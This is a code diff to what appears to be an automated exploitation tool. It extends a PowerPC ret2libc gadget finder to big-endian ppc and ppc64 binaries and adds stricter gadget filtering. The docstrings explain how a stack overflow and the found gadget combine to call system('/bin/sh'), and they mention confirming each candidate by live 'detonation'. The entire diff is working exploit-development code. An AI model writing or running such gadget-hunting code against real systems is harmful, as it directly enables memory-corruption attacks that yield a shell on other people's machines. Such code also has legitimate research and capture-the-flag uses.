@@ -1171,36 +1171,62 @@ def find_s390x_r2libc_gadgets(data: bytes) -> dict:
 _PPC_CALLEE = set(range(14, 32))
 
 
-def _ppc_words(data: bytes):
-    """(va, word) for every aligned 4-byte PPC instruction in executable segments. PPC is fixed-width;
-    `endianness` is not needed here because only ppc64le (little-endian ELFv2) is targeted."""
+def _ppc_words(data: bytes, endian: str = "little"):
+    """(va, word) for every aligned 4-byte PowerPC instruction in executable segments. PPC is
+    fixed-width; the 32-bit instruction word is read in the TARGET's byte order (`endian`) -- a
+    big-endian image (ppc / ppc64 ELFv1) stores each instruction big-endian, little-endian ELFv2
+    stores it little-endian. The instruction BITFIELDS are then decoded the same way either way."""
+    order = "big" if endian == "big" else "little"
     for off, sz, va, flags in _loads(data):
         if not (flags & 1):
             continue
         for p in range(off, off + (sz & ~3) - 3, 4):
-            yield va + (p - off), int.from_bytes(data[p:p + 4], "little")
+            yield va + (p - off), int.from_bytes(data[p:p + 4], order)
 
 
 def _ppc_is_mtctr(w):
     return (w & 0xFC1FFFFF) == 0x7C0903A6                 # mtctr rS (mtspr 9)
 
 
-def _ppc_is_mr_r3(w):                                    # mr r3, rX  ==  or r3, rX, rX
+def _ppc_is_mr(w):                                       # mr rA, rX  ==  or rA, rX, rX (rS==rB)
     return (((w >> 26) & 0x3F) == 31 and ((w >> 1) & 0x3FF) == 444 and (w & 1) == 0
-            and ((w >> 16) & 0x1F) == 3 and ((w >> 21) & 0x1F) == ((w >> 11) & 0x1F))
+            and ((w >> 21) & 0x1F) == ((w >> 11) & 0x1F))
 
 
-def find_ppc64_r2libc_gadgets(data: bytes) -> dict:
-    """PowerPC64 (ELFv2) ret2libc caller gadgets: `mtctr rC ; mr r3, rT ; ... ; bctr[l]` with rC and
-    rT both callee-saved (r14..r31). Pure byte decode -- the host objdump cannot disassemble PPC.
+def _ppc_is_mr_r3(w):                                    # mr r3, rX -- destination rA (bits 20:16) is 3
+    return _ppc_is_mr(w) and ((w >> 16) & 0x1F) == 3
+
+
+_PPC_NOP = 0x60000000                                    # ori r0, r0, 0
+
+
+def find_ppc64_r2libc_gadgets(data: bytes, endian: str = "little", clean=None) -> dict:
+    """PowerPC ret2libc caller gadgets, for ELFv2 (ppc64le) AND ELFv1 (ppc / ppc64 big-endian): a
+    CLEAN tail `... mtctr rC ; mr r3, rT ; [mr r12,* | nop]* ; bctr[l]` with rC and rT both
+    callee-saved (r14..r31). Pure byte decode -- host objdump cannot disassemble PPC; `endian` is the
+    target's byte order.
 
     The overflow controls the saved Link Register (the function's return target) and, through the
-    function's own GPR save/restore, the callee-saved registers. Point the saved LR at this gadget
-    with rC=&system and rT=&"/bin/sh": `mtctr` loads CTR=&system, `mr r3` sets the first argument,
-    `bctr` branches to system("/bin/sh"). (The gadget also does `mr r12,rC`, which is exactly the
-    ELFv2 global-entry TOC register, so system's TOC prologue resolves correctly.) Returns
-    {"callers":[{va, ctr, arg}]} with ctr/arg the GPR numbers to load with &system / &"/bin/sh"."""
-    words = list(_ppc_words(data))
+    function's own GPR save/restore, the callee-saved registers. Point the saved LR at the gadget's
+    START with rC=&system and rT=&"/bin/sh": `mtctr` loads CTR=&system, `mr r3` sets the first
+    argument, `bctr` branches to system("/bin/sh"). (On ELFv2 the gadget's `mr r12,rC` doubles as the
+    global-entry TOC setup; on ELFv1 r2 is the single static TOC, left untouched.) Returns
+    {"callers":[{va, ctr, arg}]} with va the gadget START and ctr/arg the GPRs to load.
+
+    `clean` (default: on for big-endian, off for the shipped ppc64le path) controls selection:
+
+    * LOOSE (ppc64le, unchanged): take the first callee `mtctr` and first callee `mr r3` within the 8
+      instructions before `bctr`. The ELFv2 fixtures' gadgets happen not to clobber r3/CTR after the
+      setters, so this is enough and is left exactly as shipped.
+    * CLEAN (ppc / ppc64 big-endian): additionally require the first CTR writer and the first r3
+      writer seen scanning back from `bctr` to be the controllable `mtctr`/`mr r3` themselves, and
+      every other instruction in that tail to be a harmless `mr`/`nop`. A real function body on ppc32
+      often has an arithmetic/load insn between `mr r3` and `bctr` that CLOBBERS r3 before the call;
+      CLEAN rejects such a site (the caller still confirms each candidate live, so a stray false
+      positive costs only one detonation)."""
+    if clean is None:
+        clean = (endian == "big")
+    words = list(_ppc_words(data, endian))
     callers = []
     for i, (va, w) in enumerate(words):
         if w not in (0x4E800420, 0x4E800421):            # bctr / bctrl
@@ -1211,10 +1237,22 @@ def find_ppc64_r2libc_gadgets(data: bytes) -> dict:
             wk = words[k][1]
             if wk in (0x4E800420, 0x4E800421):
                 break
-            if _ppc_is_mtctr(wk) and ctr is None and ((wk >> 21) & 0x1F) in _PPC_CALLEE:
-                ctr = (wk >> 21) & 0x1F; start = min(start, words[k][0])
-            elif _ppc_is_mr_r3(wk) and arg is None and ((wk >> 21) & 0x1F) in _PPC_CALLEE:
-                arg = (wk >> 21) & 0x1F; start = min(start, words[k][0])
+            if _ppc_is_mtctr(wk) and ctr is None:
+                r = (wk >> 21) & 0x1F
+                if r in _PPC_CALLEE:
+                    ctr = r; start = min(start, words[k][0])
+                elif clean:
+                    break                                # closest CTR writer is not controllable
+            elif _ppc_is_mr_r3(wk) and arg is None:
+                r = (wk >> 21) & 0x1F
+                if r in _PPC_CALLEE:
+                    arg = r; start = min(start, words[k][0])
+                elif clean:
+                    break                                # closest r3 writer is not controllable
+            elif clean and not (_ppc_is_mr(wk) or wk == _PPC_NOP):
+                break                                    # a non-mr/nop insn could clobber r3/CTR
+            if clean and ctr is not None and arg is not None:
+                break
         if ctr is not None and arg is not None and ctr != arg:
             callers.append({"va": start, "ctr": ctr, "arg": arg})
     return {"callers": callers}
